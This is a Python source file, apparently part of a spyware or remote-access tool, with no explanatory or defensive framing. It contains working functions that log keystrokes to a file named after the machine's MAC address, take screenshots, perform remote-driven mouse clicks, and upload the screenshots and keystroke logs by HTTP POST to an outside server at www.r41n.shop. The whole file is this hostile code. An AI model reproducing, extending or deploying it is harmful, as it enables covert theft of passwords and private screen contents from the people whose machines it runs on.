# -*- coding: utf-8 -*-

import os
import requests
import struct, uuid
from pyautogui import *
from datetime import datetime
from pynput.keyboard import Key, Listener

def get_addr():
	return ''.join([hex(fragment)[2:].zfill(2) for fragment in struct.unpack("BBBBBB", struct.pack("!Q", uuid.getnode())[2:])])

def win_click(direction, flag, x, y):
	x = int(x)
	y = int(y)
	if flag:
		click(x, y, 2, 0, direction)
	else:
		click(x, y, 1, 0, direction)

def win_capture():
	file_name = ''
	url = 'http://www.r41n.shop/storage.cgi'
	screenshot('./cap.png')
	with open('./cap.png', 'rb') as f:
		file_name=get_addr()+datetime.now().strftime("%Y_%m_%d_%H_%M_%S")+'.png'
		data = {'upload_file': f, 'file_name': file_name}
		res = requests.post(url, files=data)
	os.remove('./cap.png')
	if res.text == 'success\n':
		return False, file_name
	else:
		return True, None

def on_press(key):
	try:
		c = key.char
		with open('./' + get_addr() + '.txt', 'a') as f:
			f.write(c)
	except:
		pass

def on_release(key):
	pass

def get_keyLog():
	with open('./' + get_addr() + '.txt', 'r') as f:
		return f.read()

def post_keyLog():
	url = 'http://www.r41n.shop/key_logger.cgi'
	with open('./' + get_addr() + '.txt', 'rb') as f:
		data = {'upload_file': f, 'file_name': get_addr()+'.txt'}
		res = requests.post(url, files=data)
	if res.text == 'success\n':
		return False
	else:
		return True
